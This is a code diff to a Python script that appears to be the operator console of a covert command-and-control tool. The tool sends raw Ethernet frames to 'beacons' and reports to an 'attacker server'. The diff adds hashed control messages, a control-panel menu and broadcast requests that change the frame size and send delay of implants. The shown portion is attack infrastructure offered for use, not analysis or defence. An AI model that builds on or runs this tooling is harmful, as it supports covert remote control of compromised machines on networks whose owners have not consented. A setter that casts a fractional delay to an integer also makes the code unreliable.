@@ -8,8 +8,8 @@ frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are support
                    # this can be changed as required.
                   
 frame_delay = 0.5      # For chunked responses, could help by spacing out frames
-session_id  = "123456" # Id for accessing the session
-attacker_id = "zxczxc" # Id for returning information to the attacker server
+session_id  = "default" # Id for accessing the session
+attacker_id = "default" # Id for returning information to the attacker server
 
 # Create a hash for session_id change
 session_id_change = hashlib.sha3_256()
@@ -20,6 +20,16 @@ session_id_change = session_id_change.hexdigest()
 attacker_id_change = hashlib.sha3_256()
 attacker_id_change.update(b"AttackerChangeRequest")
 attacker_id_change = attacker_id_change.hexdigest()
+
+# Create a hash for framesize change
+framesize_change = hashlib.sha3_256()
+framesize_change.update(b"FrameSizeChangeRequest")
+framesize_change = framesize_change.hexdigest()
+
+# Create a hash for delay change
+delay_change = hashlib.sha3_256()
+delay_change.update(b"DelayChangeRequest")
+delay_change = delay_change.hexdigest()
 
 # Create hash of global ID (Only for broadcast events)
 global_id = hashlib.sha3_256()
@@ -68,6 +78,16 @@ def ChangeSessionID(userin):
 def ChangeAttackerID(userin):
     global attacker_id
     attacker_id = userin
+    
+# Setter for frame size      
+def ChangeFrameSize(userin):
+    global frame_size
+    frame_size = int(userin)
+    
+# Setter for frame size      
+def ChangeDelay(userin):
+    global frame_delay
+    frame_delay = int(userin)
 
 # Define a callback function to handle each frame
 def process_frame(frame):
@@ -108,6 +128,22 @@ def process_frame(frame):
                 string = Delimiter(att_index, str(eth_frame.payload.original), attacker_id_change) 
                 print("changing attid to: " + string)
                 ChangeAttackerID(string)
+                index = -1
+                
+            if framesize_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond framesize change request
+                # First, find index
+                frame_index = str(eth_frame.payload.original).find(framesize_change)  
+                string = Delimiter(frame_index, str(eth_frame.payload.original), framesize_change) 
+                print("changing framesize to: " + string)
+                ChangeFrameSize(string)
+                index = -1
+                
+            if delay_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond frame delay change request
+                # First, find index
+                delay_index = str(eth_frame.payload.original).find(delay_change)  
+                string = Delimiter(delay_index, str(eth_frame.payload.original), delay_change) 
+                print("changing delay to: " + string)
+                ChangeDelay(string)
                 index = -1
              
             if index != -1:
@@ -176,8 +212,10 @@ def ControlPanel(userin):
             print("4) change beacon session id")
             print("5) change beacon attacker id")
             print("6) change attacker id for broadcast domain")
-            print("7) help")
-            print("8) disable options")
+            print("7) change frame size for beacon")
+            print("8) change chunked request delay")
+            print("9) help")
+            print("10) disable options")
             print(">", end='')
             userin = input()
             
@@ -217,6 +255,7 @@ def ControlPanel(userin):
                     print("Attacker ID is changed to " + attacker_id)
             
             elif userin == "6":
+                print("This request may need to be issued multiple times as the request are stateless")
                 userin = input("Are you sure you want to issue a global attacker id change? (y/n) ")
                 if userin == "y":
                     userin = input("New attacker ID: ")
@@ -225,11 +264,31 @@ def ControlPanel(userin):
                     send_frame(changeattidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", global_id)
                     attacker_id = userin
                     print("Attacker ID is changed to " + attacker_id)
-                
+                    
             elif userin == "7":
+                print("Current beacon [" + session_id + "]:")
+                userin = input("Change frame size? (y/n) ")
+                if userin == "y":
+                    userin = input("New frame size: ")
+                    # Send request to beacon
+                    framesizereq = framesize_change + userin
+                    send_frame(framesizereq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
+                    print("Framesize changed to " + userin)
+                    
+            elif userin == "8":
+                print("Current beacon [" + session_id + "]:")
+                userin = input("Change chunked response time (delay)? (y/n) ")
+                if userin == "y":
+                    userin = input("New delay: ")
+                    # Send request to beacon
+                    delayreq = delay_change + userin
+                    send_frame(delayreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
+                    print("Delay changed to " + userin)
+                
+            elif userin == "9":
                 print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
             
-            elif userin == "8":
+            elif userin == "10":
                 userin = "disable options"
                 print()
                 break
@@ -256,6 +315,7 @@ def connect():
     listener_thread.start()
     
     userin = ""
+    print("Please enter 'enable options' for more controls")
     while userin != "x":
         userin += session_id 
         userin += str(input())
